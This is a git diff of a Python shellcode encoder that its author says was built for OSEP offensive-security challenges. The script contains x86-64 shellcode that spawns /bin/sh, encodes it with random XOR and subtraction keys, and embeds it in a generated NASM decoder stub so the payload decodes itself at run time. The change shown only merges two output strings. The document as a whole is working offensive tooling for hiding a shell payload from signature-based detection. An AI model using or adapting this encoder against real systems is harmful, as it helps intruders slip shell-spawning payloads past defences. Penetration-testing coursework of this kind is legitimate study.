@@ -1,7 +1,7 @@
 # built for OSEP challenges
 # techniques heavily drawn from SLAE, deff check that course out if you have not already :)
 # Author: kymb0
-#!/usr/bin/python
+
 import sys
 import random
 import os
@@ -16,15 +16,13 @@ print(key2)
 print(xor2)
 shellcode = (b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
 encoded = ""
-encoded2 = ""
 
 for x in (shellcode) :
 	y = x^xor
-	encoded += '\\x%02x' % (y-key & 0xff)
-	encoded2 += '0x%02x,' % (y-key & 0xff)
-encoded += '\\x%02x' % key
-encoded2 += '0x%02x' % key
-length = len(bytearray(shellcode))
+	encoded += '0x%02x,' % (y-key & 0xff)
+	
+encoded += '0x%02x' % key
+
 
 nasm_file= f'''
 global _start
@@ -44,7 +42,7 @@ decode:
     loop decode
 meat:
     call decoder
-    potatoes: db {encoded2}
+    potatoes: db {encoded}
 
 '''
 nasm_compiler = '''
